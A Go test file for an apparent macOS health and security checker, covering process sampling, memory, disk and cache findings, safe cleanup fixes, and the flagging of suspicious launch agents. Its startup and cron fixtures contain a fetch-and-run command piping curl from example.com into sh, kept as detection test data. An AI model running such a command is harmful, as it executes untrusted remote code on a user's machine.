package raphael

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/irie-people/irie/internal/proc"
	"github.com/irie-people/irie/internal/sysload"
)

// fakeRunner answers each command line it knows with its output, and
// fails the rest. It records what ran.
type fakeRunner struct {
	out  map[string]string // stdout, by the command line
	errs map[string]string // stderr, by the command line
	fail map[string]bool   // command lines that exit non-zero
	ran  []string
}

func (f *fakeRunner) Run(_ context.Context, name string, args ...string) ([]byte, []byte, error) {
	line := strings.Join(append([]string{name}, args...), " ")
	f.ran = append(f.ran, line)
	out, okOut := f.out[line]
	errb, okErr := f.errs[line]
	if !okOut && !okErr {
		return nil, nil, errors.New("not here")
	}
	if f.fail[line] {
		return []byte(out), []byte(errb), errors.New("exit status 1")
	}
	return []byte(out), []byte(errb), nil
}

func TestParsePS(t *testing.T) {
	out := "  33913     1   501 114704   8:40.05 /Applications/Irie.app/Contents/MacOS/Irie\n" +
		"  152     1    88 110416 497:24.45 /System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer\n" +
		"  700   1  501  2048  1-02:03:04.50 /Applications/Visual Studio Code.app/Contents/MacOS/Electron Helper\n" +
		"garbage\n"
	ps := ParsePS(out)
	if len(ps) != 3 {
		t.Fatalf("procs = %+v", ps)
	}
	if p := ps[0]; p.PID != 33913 || p.PPID != 1 || p.UID != 501 || p.RSS != 114704<<10 || p.CPU != 8*time.Minute+40050*time.Millisecond || p.Path != "/Applications/Irie.app/Contents/MacOS/Irie" {
		t.Errorf("first = %+v", p)
	}
	if ps[1].CPU != 497*time.Minute+24450*time.Millisecond {
		t.Errorf("minutes past 59: %v", ps[1].CPU)
	}
	if p := ps[2]; p.CPU != 26*time.Hour+3*time.Minute+4500*time.Millisecond || p.Path != "/Applications/Visual Studio Code.app/Contents/MacOS/Electron Helper" {
		t.Errorf("days and spaces: %+v", p)
	}
}

func TestTheSamplerFindsWhatRunsHotForLong(t *testing.T) {
	var s Sampler
	t0 := time.Now()
	starts := map[int]int64{1: 10, 2: 20, 3: 30}
	sample := func(i int, busy, burst, idle time.Duration) []Proc {
		ps := []Proc{{PID: 1, CPU: busy}, {PID: 2, CPU: burst}, {PID: 3, CPU: idle}}
		s.Add(t0.Add(time.Duration(i)*time.Minute), ps, starts)
		return ps
	}
	var ps []Proc
	for i := 0; i <= 12; i++ {
		// pid 1 uses 95% of a CPU all along; pid 2 only now and then; pid 3 sleeps.
		burst := time.Duration(i/4) * 50 * time.Second
		ps = sample(i, time.Duration(i)*57*time.Second, burst, time.Second)
	}
	hot := s.Hot(ps)
	if len(hot) != 1 || hot[0].PID != 1 || hot[0].Start != 10 || hot[0].For < hotFor || hot[0].Share < 0.9 || hot[0].Share > 1 {
		t.Fatalf("hot = %+v", hot)
	}
	// A pid used again by a new process starts afresh.
	starts[1] = 11
	s.Add(t0.Add(13*time.Minute), ps, starts)
	if hot := s.Hot(ps); len(hot) != 0 {
		t.Errorf("a new process with an old pid is hot: %+v", hot)
	}
	// A gap, such as the Mac asleep, starts the count again.
	var g Sampler
	g.Add(t0, []Proc{{PID: 1}}, starts)
	g.Add(t0.Add(time.Hour), []Proc{{PID: 1, CPU: time.Hour}}, starts)
	if hot := g.Hot([]Proc{{PID: 1, CPU: time.Hour}}); len(hot) != 0 {
		t.Errorf("hot across a gap: %+v", hot)
	}
}

func TestHotFindingsAdviseAndOfferAStopOnlyForAPlainProgram(t *testing.T) {
	hot := []Hot{
		{Proc: Proc{PID: 10, UID: 501, Path: "/Users/alice/go/bin/stuck-server"}, Start: 1, Share: 0.99, For: 2 * time.Hour},
		{Proc: Proc{PID: 11, UID: 501, Path: "/Applications/Safari.app/Contents/MacOS/Safari"}, Start: 2, Share: 0.9, For: 15 * time.Minute},
		{Proc: Proc{PID: 12, UID: 0, Path: "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Support/mds_stores"}, Start: 3, Share: 0.85, For: 20 * time.Minute},
		{Proc: Proc{PID: 13, UID: 501, Path: "/opt/homebrew/bin/go"}, Start: 4, Share: 1, For: time.Hour},
		{Proc: Proc{PID: 14, UID: 501, Path: "/Users/alice/.local/share/irie/bin/irie"}, Start: 5, Share: 1, For: time.Hour},
	}
	o := Owner{Session: map[int]string{13: "fix-login"}, Irie: map[int]bool{14: true}}
	fs := hotFindings(hot, o, 501, "/Users/alice")
	if len(fs) != 4 {
		t.Fatalf("findings = %+v; want the session's own work left out", fs)
	}
	stuck, safari, spot, irie := fs[0], fs[1], fs[2], fs[3]
	if stuck.Level != Warn || stuck.Fix == nil || stuck.Fix.pid != 10 || stuck.Fix.start != 1 || !slices.Equal(stuck.Fix.Run, []string{"kill -TERM 10"}) || !strings.Contains(stuck.Text, "stuck-server has used 99% of a CPU for 2 hours") {
		t.Errorf("stuck = %+v", stuck)
	}
	if safari.Level != Note || safari.Fix != nil || !strings.Contains(safari.Advice, "Quit Safari") {
		t.Errorf("an app is quit by the person, who can save: %+v", safari)
	}
	if spot.Fix != nil || !strings.Contains(spot.Advice, "Spotlight") {
		t.Errorf("macOS's own: %+v", spot)
	}
	if irie.Fix != nil || !strings.Contains(irie.Advice, "Irie's own") {
		t.Errorf("Irie's own: %+v", irie)
	}
}

func TestMemoryFinding(t *testing.T) {
	ps := []Proc{
		{PID: 1, RSS: 3 << 30, Path: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"},
		{PID: 2, RSS: 1 << 30, Path: "/Applications/Google Chrome.app/Contents/Frameworks/Helper.app/Contents/MacOS/Google Chrome Helper"},
		{PID: 3, RSS: 400 << 20, Path: "/Users/alice/.local/share/claude/versions/2.1.316"},
		{PID: 4, RSS: 300 << 20, Path: "claude"},
	}
	o := Owner{Session: map[int]string{4: "fix-login"}}
	short := memoryFinding(Memory{Total: 16 << 30, SwapUsed: 6 << 30, Pressure: sysload.PressureWarn}, ps, o)
	if short.Level != Warn || !strings.Contains(short.Text, "6 GB of swap") || !strings.Contains(short.Text, "16 GB of RAM") {
		t.Errorf("short = %+v", short)
	}
	if len(short.Evidence) != 1 || !strings.Contains(short.Evidence[0], "Google Chrome ×2 (4 GB)") || !strings.Contains(short.Evidence[0], "claude (400 MB)") || !strings.Contains(short.Evidence[0], "Irie's sessions (300 MB)") {
		t.Errorf("what takes the most = %v", short.Evidence)
	}
	if well := memoryFinding(Memory{Total: 16 << 30}, ps, o); well.Level != OK || well.Text != "Memory: 16 GB of RAM, no pressure." {
		t.Errorf("well = %+v", well)
	}
	if swapped := memoryFinding(Memory{Total: 16 << 30, SwapUsed: 5 << 30, Pressure: sysload.PressureNormal}, ps, o); swapped.Level != Note {
		t.Errorf("heavy swap, no pressure now = %+v", swapped)
	}
	if hogs := bigHogs(Memory{Total: 16 << 30}, ps, o); len(hogs) != 1 || !strings.Contains(hogs[0].Text, "Google Chrome takes 4 GB of memory, 25% of your RAM") {
		t.Errorf("big hogs = %+v", hogs)
	}
}

func TestDiskFinding(t *testing.T) {
	const gb = 1000 * 1000 * 1000
	for _, c := range []struct {
		total, free int64
		level       string
	}{
		{1000 * gb, 12 * gb, Warn},
		{1000 * gb, 90 * gb, Warn},
		{1000 * gb, 150 * gb, Note},
		{1000 * gb, 500 * gb, OK},
		{100 * gb, 14 * gb, Warn},
	} {
		if f := diskFinding(Disk{Total: c.total, Free: c.free}); f.Level != c.level {
			t.Errorf("%d of %d free: %+v, want %s", c.free/gb, c.total/gb, f, c.level)
		}
	}
	if f := diskFinding(Disk{}); f.ID != "" {
		t.Errorf("no disk read: %+v", f)
	}
}

func TestParsePlist(t *testing.T) {
	xml := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.example.helper &amp; more</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/helper</string>
		<string>--serve</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<dict><key>SuccessfulExit</key><false/></dict>
	<key>StartInterval</key>
	<integer>3600</integer>
	<key>When</key>
	<date>2026-11-01T10:00:00Z</date>
	<key>Blob</key>
	<data>AAEC</data>
</dict>
</plist>`
	v, err := parsePlist([]byte(xml))
	if err != nil {
		t.Fatal(err)
	}
	m := v.(map[string]any)
	if plistString(m, "Label") != "com.example.helper & more" || !slices.Equal(plistStrings(m, "ProgramArguments"), []string{"/usr/local/bin/helper", "--serve"}) ||
		!plistBool(m, "RunAtLoad") || !plistBool(m, "KeepAlive") || m["StartInterval"] != int64(3600) || plistString(m, "When") != "2026-11-01T10:00:00Z" {
		t.Errorf("plist = %#v", m)
	}
	if _, err := parsePlist([]byte("<plist><dict><key>x</key>")); err == nil {
		t.Error("a broken plist reads")
	}
}

func TestParseCodesignAndSpctl(t *testing.T) {
	signed, adhoc, auth := parseCodesign("Executable=/x\nIdentifier=com.docker.vmnetd\nFormat=Mach-O thin (arm64)\nAuthority=Developer ID Application: Docker Inc (9BNSXJN65R)\nAuthority=Developer ID Certification Authority\nAuthority=Apple Root CA\nTeamIdentifier=9BNSXJN65R\n")
	if !signed || adhoc || auth != "Developer ID Application: Docker Inc (9BNSXJN65R)" {
		t.Errorf("developer id: %v %v %q", signed, adhoc, auth)
	}
	if signed, adhoc, _ := parseCodesign("Identifier=tmux-5555\nSignature=adhoc\nTeamIdentifier=not set\n"); !signed || !adhoc {
		t.Errorf("ad hoc: %v %v", signed, adhoc)
	}
	if signed, _, _ := parseCodesign("/tmp/x: code object is not signed at all\n"); signed {
		t.Error("unsigned reads as signed")
	}
	if ok, src := parseSpctl("/x: accepted\nsource=Notarized Developer ID\norigin=Developer ID Application: Docker Inc (9BNSXJN65R)\n"); !ok || src != "Notarized Developer ID" {
		t.Errorf("notarized: %v %q", ok, src)
	}
	if ok, src := parseSpctl("/x: rejected\nsource=Unnotarized Developer ID\n"); ok || src != "Unnotarized Developer ID" {
		t.Errorf("unnotarized: %v %q", ok, src)
	}
}

func TestBrewFrees(t *testing.T) {
	for out, want := range map[string]int64{
		"Would remove: /x (1.2MB)\n==> This operation would free approximately 1.5GB of disk space.\n": 1_500_000_000,
		"==> This operation would free approximately 512KB of disk space.":                             512_000,
		"Would remove: /x (1.2MB)\n": -1,
		"":                           0,
	} {
		if got := brewFrees(out); got != want {
			t.Errorf("brewFrees(%q) = %d, want %d", out, got, want)
		}
	}
	if got := brewFreed("==> This operation has freed approximately 2GB of disk space."); got != 2_000_000_000 {
		t.Errorf("brewFreed = %d", got)
	}
}

func TestParseApps(t *testing.T) {
	out := ` 1) "Dock" ASN:0x0-0x1001:
    bundleID="com.apple.dock"
    pid = 401 type="UIElement"
 2) "Claude" ASN:0x0-0x2002:
    bundleID="com.anthropic.claudefordesktop"
    bundle path="/Applications/Claude.app"
`
	apps := parseApps(out)
	if apps["com.apple.dock"] != "Dock" || apps["com.anthropic.claudefordesktop"] != "Claude" {
		t.Fatalf("apps = %v", apps)
	}
	if name, ok := runningAs("com.anthropic.claudefordesktop.ShipIt", apps); !ok || name != "Claude" {
		t.Errorf("an app's updater counts as the app: %q %v", name, ok)
	}
	if _, ok := runningAs("com.spotify.client", apps); ok {
		t.Error("an app not open runs")
	}
	// A cache named for the app is the app's, not one of its helpers'.
	chrome := map[string]string{"com.google.Chrome.helper.renderer": "Google Chrome Helper (Renderer)", "com.google.Chrome": "Google Chrome", "com.google.Chrome.helper": "Google Chrome Helper"}
	for i := 0; i < 20; i++ {
		if name, _ := runningAs("com.google.Chrome", chrome); name != "Google Chrome" {
			t.Fatalf("Chrome's cache is %q's", name)
		}
	}
	if name, _ := runningAs("com.google.Chrome.helper.renderer.cache", chrome); name != "Google Chrome Helper (Renderer)" {
		t.Errorf("the nearest app = %q", name)
	}
	if !appRunning("org.example.app", "/Applications/Example.app", nil, []Proc{{Path: "/Applications/Example.app/Contents/MacOS/Example"}}) {
		t.Error("a process in the app's bundle does not count")
	}
}

// cacheMac is a home with caches, and the tools that measure them.
func cacheMac(t *testing.T) (home string, r *fakeRunner) {
	t.Helper()
	if runtime.GOOS != "darwin" {
		t.Skip("the caches of apps are a Mac's")
	}
	home = t.TempDir()
	caches := filepath.Join(home, "Library", "Caches")
	for _, d := range []string{"go-build", "Homebrew", "com.example.open", "com.example.closed", "com.apple.Safari", "irie", "Yarn", "small.app.cache", "mystery"} {
		if err := os.MkdirAll(filepath.Join(caches, d), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	var du []string
	sizes := map[string]int64{"go-build": 13 << 20, "Homebrew": 6 << 20, "com.example.open": 2 << 20, "com.example.closed": 3 << 20, "com.apple.Safari": 9 << 20, "irie": 9 << 20, "Yarn": 4 << 20, "small.app.cache": 1, "mystery": 8 << 20}
	ents, _ := os.ReadDir(caches)
	var paths []string
	for _, e := range ents {
		p := filepath.Join(caches, e.Name())
		paths = append(paths, p)
		du = append(du, strings.Join([]string{itoa(sizes[e.Name()]), p}, "\t"))
	}
	r = &fakeRunner{out: map[string]string{
		"/usr/bin/du -sk -x " + strings.Join(paths, " "): strings.Join(du, "\n") + "\n",
		"/usr/bin/lsappinfo list": ` 1) "Open" ASN:0x0-0x1:
    bundleID="com.example.open"
`,
		`/usr/bin/mdfind kMDItemCFBundleIdentifier == "com.example.closed"`: "/Applications/Closed.app\n",
		`/usr/bin/mdfind kMDItemCFBundleIdentifier == "com.example.open"`:   "/Applications/Open.app\n",
	}}
	return home, r
}

func itoa(kb int64) string { return strconv.FormatInt(kb, 10) }

func TestCacheFindings(t *testing.T) {
	home, r := cacheMac(t)
	// Sizes are in KB as du gives them: these stand for gigabytes.
	fs, total := cacheFindings(context.Background(), r, cachesInput{Home: home})
	if total == 0 {
		t.Error("no total")
	}
	ids := map[string]Finding{}
	for _, f := range fs {
		ids[f.ID] = f
	}
	for _, never := range []string{"cache:com.apple.Safari", "cache:irie", "cache:mystery", "cache:small.app.cache"} {
		if _, ok := ids[never]; ok {
			t.Errorf("%s is offered: the system's, Irie's own, one whose owner can't be told, and one too small never are", never)
		}
	}
	closed := ids["cache:com.example.closed"]
	if closed.Fix == nil || closed.Fix.kind != fixTrash || !strings.Contains(closed.Text, "Closed's cache") || !strings.HasPrefix(closed.Fix.Run[0], "mv ~/Library/Caches/com.example.closed ~/.Trash/") {
		t.Errorf("a closed app's cache goes to the Trash: %+v", closed)
	}
	if open := ids["cache:com.example.open"]; open.Fix != nil || !strings.Contains(open.Advice, "Open is open now") {
		t.Errorf("an open app's cache waits: %+v", open)
	}
	if y := ids["cache:Yarn"]; y.Fix != nil || !strings.Contains(y.Advice, "yarn cache clean") {
		t.Errorf("a tool's cache is the tool's to clear: %+v", y)
	}
	// Only a thorough look asks Homebrew, which can take minutes.
	for _, line := range r.ran {
		if strings.Contains(line, "cleanup -n") {
			t.Errorf("ran %s", line)
		}
	}
	// The biggest first.
	if len(fs) < 2 || fs[0].Size < fs[1].Size {
		t.Errorf("order: %+v", fs)
	}
}

func TestGoCacheFixWaitsForGoToBeFree(t *testing.T) {
	if got := busyWith([]Proc{{PID: 7, Path: "/opt/homebrew/Cellar/go/1.27.3/libexec/pkg/tool/darwin_arm64/compile"}}, []string{"go"}); !strings.Contains(got, "compile") {
		t.Errorf("a compiler at work = %q", got)
	}
	if got := busyWith([]Proc{{PID: 8, Path: "/tmp/go-build123/b001/core.test"}}, []string{"go"}); got == "" {
		t.Error("a test binary at work is not")
	}
	if got := busyWith([]Proc{{PID: 9, Path: "/usr/bin/vim"}}, []string{"go"}); got != "" {
		t.Errorf("vim = %q", got)
	}
	ps := "  42 1 501 100 0:01.00 /opt/homebrew/bin/go\n"
	r := &fakeRunner{out: map[string]string{"/bin/ps " + strings.Join(psArgs, " "): ps}}
	f := Fix{Label: "Clear Go's build cache", kind: fixTool, tool: "/opt/homebrew/bin/go", path: "/x", busy: []string{"go"}}
	_, err := Do(context.Background(), r, f, DoInput{Home: "/Users/alice", Wait: time.Millisecond, Poll: time.Millisecond})
	if err == nil || !strings.Contains(err.Error(), "still at work") {
		t.Fatalf("err = %v", err)
	}
	for _, line := range r.ran {
		if strings.Contains(line, "clean") {
			t.Errorf("ran %s while Go builds", line)
		}
	}
	// Once Go is free it clears, and says what that freed.
	r.out["/bin/ps "+strings.Join(psArgs, " ")] = ""
	r.out["/usr/bin/du -sk -x /x"] = "100\t/x\n"
	r.out["/opt/homebrew/bin/go clean -cache"] = ""
	said, err := Do(context.Background(), r, f, DoInput{Home: "/Users/alice", Wait: time.Second, Poll: time.Millisecond})
	if err != nil || !strings.HasPrefix(said, "Clear Go's build cache") || !slices.Contains(r.ran, "/opt/homebrew/bin/go clean -cache") {
		t.Errorf("said %q, %v; ran %v", said, err, r.ran)
	}
}

func TestTrashFixPutsAClosedAppsCacheInTheTrash(t *testing.T) {
	home, r := cacheMac(t)
	fs, _ := cacheFindings(context.Background(), r, cachesInput{Home: home})
	var fix *Fix
	for _, f := range fs {
		if f.ID == "cache:com.example.closed" {
			fix = f.Fix
		}
	}
	if fix == nil {
		t.Fatal("no fix")
	}
	src := filepath.Join(home, "Library", "Caches", "com.example.closed")
	os.WriteFile(filepath.Join(src, "blob"), []byte("x"), 0o600)
	// One of that name in the Trash already is kept.
	os.MkdirAll(filepath.Join(home, ".Trash", "com.example.closed"), 0o700)
	r.out["/bin/ps "+strings.Join(psArgs, " ")] = ""
	r.out["/usr/bin/du -sk -x "+src] = "3072\t" + src + "\n"
	said, err := Do(context.Background(), r, *fix, DoInput{Home: home})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(home, ".Trash", "com.example.closed 2", "blob")); err != nil || exists(src) {
		t.Errorf("not in the Trash: %v; said %q", err, said)
	}
	// Gone already, or opened meanwhile: left be.
	if _, err := Do(context.Background(), r, *fix, DoInput{Home: home}); err == nil || !strings.Contains(err.Error(), "gone") {
		t.Errorf("again: %v", err)
	}
	os.MkdirAll(src, 0o700)
	r.out["/usr/bin/lsappinfo list"] = ` 1) "Closed" ASN:0x0-0x2:
    bundleID="com.example.closed"
`
	if _, err := Do(context.Background(), r, *fix, DoInput{Home: home}); err == nil || !strings.Contains(err.Error(), "open now") {
		t.Errorf("opened meanwhile: %v", err)
	}
	// A folder outside the caches is never moved.
	bad := *fix
	bad.path = filepath.Join(home, "Documents")
	if _, err := Do(context.Background(), r, bad, DoInput{Home: home}); err == nil {
		t.Error("moved a folder outside the caches")
	}
}

func TestStopFixAsksTheSameProcessToStop(t *testing.T) {
	defer func(rt func() (proc.Table, error), s func(int, syscall.Signal) error) { readTable, signal = rt, s }(readTable, signal)
	alive := true
	readTable = func() (proc.Table, error) {
		if !alive {
			return proc.NewTable(nil), nil
		}
		return proc.NewTable([]proc.Proc{{PID: 10, Start: 1}}), nil
	}
	var sent []int
	signal = func(pid int, s syscall.Signal) error {
		sent = append(sent, pid)
		alive = false
		return nil
	}
	f := Fix{kind: fixStop, pid: 10, start: 1, path: "/Users/alice/go/bin/stuck-server"}
	if said, err := Do(context.Background(), nil, f, DoInput{}); err != nil || !strings.HasPrefix(said, "Stopped stuck-server") || !slices.Equal(sent, []int{10}) {
		t.Errorf("said %q, %v, sent %v", said, err, sent)
	}
	// Another process that took its pid is never touched.
	alive, sent = true, nil
	f.start = 2
	if _, err := Do(context.Background(), nil, f, DoInput{}); err == nil || len(sent) != 0 {
		t.Errorf("a pid used again: %v, sent %v", err, sent)
	}
}

// launchMac is a Mac's launchd folders under a temporary root, with a home
// in it.
func launchMac(t *testing.T) (in startupInput, write func(dir, name, body string) string) {
	t.Helper()
	root := t.TempDir()
	home := filepath.Join(root, "Users", "alice")
	for _, d := range []string{filepath.Join(home, "Library", "LaunchAgents"), filepath.Join(root, "Library", "LaunchAgents"), filepath.Join(root, "Library", "LaunchDaemons")} {
		os.MkdirAll(d, 0o755)
	}
	in = startupInput{Home: home, UID: 501, Root: root, Now: time.Now()}
	write = func(dir, name, body string) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	return in, write
}

func plistOf(label string, args ...string) string {
	var b strings.Builder
	b.WriteString(`<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict>`)
	if label != "" {
		b.WriteString("<key>Label</key><string>" + label + "</string>")
	}
	if len(args) > 0 {
		b.WriteString("<key>ProgramArguments</key><array>")
		for _, a := range args {
			b.WriteString("<string>" + a + "</string>")
		}
		b.WriteString("</array><key>RunAtLoad</key><true/>")
	}
	b.WriteString("</dict></plist>")
	return b.String()
}

func TestStartupFindingsWeighTheSigns(t *testing.T) {
	in, write := launchMac(t)
	agents := filepath.Join(in.Home, "Library", "LaunchAgents")
	// The plists name programs as on the Mac; the files are under the root.
	file := func(path string) string {
		p := filepath.Join(in.Root, path)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte("bin"), 0o755)
		real, _ := filepath.EvalSymlinks(p)
		return real
	}
	// A notarized helper of a known maker: fine.
	good := file("/Applications/Good.app/Contents/MacOS/helper")
	write(agents, "com.good.helper.plist", plistOf("com.good.helper", "/Applications/Good.app/Contents/MacOS/helper"))
	// Hidden in Library, unsigned, under Apple's name: suspicious.
	bad := file("/Users/alice/Library/.hidden/updater")
	write(agents, "com.apple.updater.plist", plistOf("com.apple.updater", "/Users/alice/Library/.hidden/updater"))
	// Fetches and runs code with a shell: suspicious, and nothing to sign.
	file("/bin/sh")
	write(agents, "org.fetch.plist", plistOf("org.fetch", "/bin/sh", "-c", "curl -s https://example.com/x | sh"))
	// Left from an app long gone.
	write(agents, "com.gone.agent.plist", plistOf("com.gone.agent", "/Applications/Gone.app/Contents/MacOS/gone"))
	// Empty.
	write(agents, "com.empty.plist", plistOf(""))
	// One the person knows.
	write(agents, "com.mine.tool.plist", plistOf("com.mine.tool", "/Users/alice/Library/.hidden/updater"))
	in.Known = []string{"com.mine.tool"}
	r := &fakeRunner{
		errs: map[string]string{
			"/usr/bin/codesign -dv --verbose=2 " + good: "Authority=Developer ID Application: Good Ltd (TEAM)\n",
			"/usr/bin/codesign -dv --verbose=2 " + bad:  bad + ": code object is not signed at all\n",
			"/usr/bin/codesign --verify " + good:        "",
		},
		out: map[string]string{
			"/usr/sbin/spctl -a -vv -t exec " + appOf(good): appOf(good) + ": accepted\nsource=Notarized Developer ID\n",
		},
	}
	fs, fine := startupFindings(context.Background(), r, in)
	by := map[string]Finding{}
	for _, f := range fs {
		by[f.Key] = f
	}
	if _, ok := by["com.good.helper"]; ok {
		t.Errorf("a notarized helper is flagged: %+v", by["com.good.helper"])
	}
	if _, ok := by["com.mine.tool"]; ok {
		t.Error("one the person knows is flagged")
	}
	apple := by["com.apple.updater"]
	// He says how sure he is, and never claims to be certain.
	if apple.Level != Warn || !strings.Contains(apple.Sure, "not certain") || strings.Contains(apple.Sure, "definitely") || apple.Fix == nil || apple.Fix.kind != fixLaunchOff {
		t.Errorf("hidden, unsigned, under Apple's name = %+v", apple)
	}
	if !slices.ContainsFunc(apple.Evidence, func(e string) bool { return strings.Contains(e, "Apple's") }) || !slices.ContainsFunc(apple.Evidence, func(e string) bool { return strings.Contains(e, "hidden") }) {
		t.Errorf("evidence = %v", apple.Evidence)
	}
	if want := []string{"launchctl bootout gui/501/com.apple.updater", "launchctl disable gui/501/com.apple.updater"}; !slices.Equal(apple.Fix.Run, want) || !strings.Contains(apple.Fix.Undo, "launchctl enable gui/501/com.apple.updater") {
		t.Errorf("fix = %+v", apple.Fix)
	}
	if f := by["org.fetch"]; f.Level != Warn || !slices.ContainsFunc(f.Evidence, func(e string) bool { return strings.Contains(e, "fetches") }) {
		t.Errorf("fetch and run = %+v", f)
	}
	if f := by["com.gone.agent"]; f.Level != Note || !strings.Contains(f.Text, "no longer here") || f.Fix == nil {
		t.Errorf("left over = %+v", f)
	}
	if f := by["com.empty"]; f.Level != Note || !strings.Contains(f.Text, "empty") || !strings.Contains(f.Advice, "leave it") || f.Fix != nil {
		t.Errorf("empty = %+v", f)
	}
	if len(fine) == 0 || !strings.Contains(fine[0], "6 launch agents and daemons") || !strings.Contains(fine[0], "1 you know") {
		t.Errorf("fine = %v", fine)
	}
	// A daemon's is the system's: no fix, an administrator's to remove.
	daemons := filepath.Join(in.Root, "Library", "LaunchDaemons")
	write(daemons, "com.apple.sneaky.plist", plistOf("com.apple.sneaky", "/Users/alice/Library/.hidden/updater"))
	fs, _ = startupFindings(context.Background(), r, in)
	for _, f := range fs {
		if f.Key == "com.apple.sneaky" && (f.Fix != nil || !strings.Contains(f.Advice, "administrator")) {
			t.Errorf("a daemon = %+v", f)
		}
	}
}

func TestHiddenPart(t *testing.T) {
	for path, want := range map[string]string{
		"/Users/alice/.local/bin/tool":             "",
		"/Users/alice/.cargo/bin/rg":               "",
		"/Users/alice/.toolbox/builds/stable/tool": ".toolbox",
		"/Users/alice/Library/.x/agent":            ".x",
		"/opt/tool/.agent":                         ".agent",
		"/Applications/Good.app/Contents/MacOS/g":  "",
	} {
		if got := hiddenPart(path, "/Users/alice"); got != want {
			t.Errorf("hiddenPart(%s) = %q, want %q", path, got, want)
		}
	}
}

func TestCronJobs(t *testing.T) {
	jobs := cronJobs("# m h dom mon dow\nPATH=/usr/bin:/bin\nMAILTO=\"\"\n\n*/5 * * * * /usr/local/bin/backup\n@reboot curl -s https://example.com/x | sh\n")
	if !slices.Equal(jobs, []string{"*/5 * * * * /usr/local/bin/backup", "@reboot curl -s https://example.com/x | sh"}) {
		t.Errorf("jobs = %q", jobs)
	}
}

func TestProtectFindings(t *testing.T) {
	root := t.TempDir()
	b := filepath.Join(root, "Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents")
	os.MkdirAll(filepath.Join(b, "Resources"), 0o755)
	os.WriteFile(filepath.Join(b, "Info.plist"), []byte(`<plist><dict><key>CFBundleShortVersionString</key><string>5368</string></dict></plist>`), 0o644)
	meta := filepath.Join(b, "Resources", "XProtect.meta.plist")
	os.WriteFile(meta, nil, 0o644)
	old := time.Now().Add(-90 * 24 * time.Hour)
	os.Chtimes(meta, old, old)
	os.MkdirAll(filepath.Join(root, "Library/Preferences"), 0o755)
	os.WriteFile(filepath.Join(root, "Library/Preferences/com.apple.SoftwareUpdate.plist"), []byte(`<plist><dict><key>ConfigDataInstall</key><false/><key>RecommendedUpdates</key><array><dict><key>Display Name</key><string>macOS Sonoma 14.8.9</string><key>Display Version</key><string>14.8.9</string></dict><dict><key>Display Name</key><string>Command Line Tools for Xcode</string><key>Display Version</key><string>15.3</string></dict></array></dict></plist>`), 0o644)
	r := &fakeRunner{out: map[string]string{
		"/usr/bin/csrutil status":  "System Integrity Protection status: enabled.\n",
		"/usr/sbin/spctl --status": "assessments disabled\n",
		"/usr/bin/fdesetup status": "FileVault is On.\n",
		"/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate": "Firewall is disabled. (State = 0)\n",
	}}
	fs, fine := protectFindings(context.Background(), r, protectInput{Now: time.Now(), Root: root})
	by := map[string]Finding{}
	for _, f := range fs {
		by[f.ID] = f
	}
	if by["gatekeeper"].Level != Warn || by["xprotect"].Level != Warn || by["autoupdate"].Level != Warn || by["firewall"].Level != Note {
		t.Errorf("findings = %+v", fs)
	}
	if got, want := by["updates"].Text, "Updates are waiting: macOS Sonoma 14.8.9 and Command Line Tools for Xcode 15.3."; got != want {
		t.Errorf("updates = %q, want %q", got, want)
	}
	if _, ok := by["sip"]; ok {
		t.Error("SIP is on, yet flagged")
	}
	if len(fine) != 1 || fine[0] != "On: System Integrity Protection and FileVault." {
		t.Errorf("fine = %v", fine)
	}
}

func TestSizes(t *testing.T) {
	for n, want := range map[int64]string{12_200_000_000: "12.2 GB", 995_000_000_000: "995 GB", 640_000_000: "640 MB", 1_000_000_000_000: "1 TB", 500: "500 bytes"} {
		if got := Size(n); got != want {
			t.Errorf("Size(%d) = %q, want %q", n, got, want)
		}
	}
	if got := MemSize(18 << 30); got != "18 GB" {
		t.Errorf("MemSize = %q", got)
	}
	if got := progName("/Users/alice/.local/share/claude/versions/2.1.316"); got != "claude" {
		t.Errorf("progName = %q", got)
	}
}
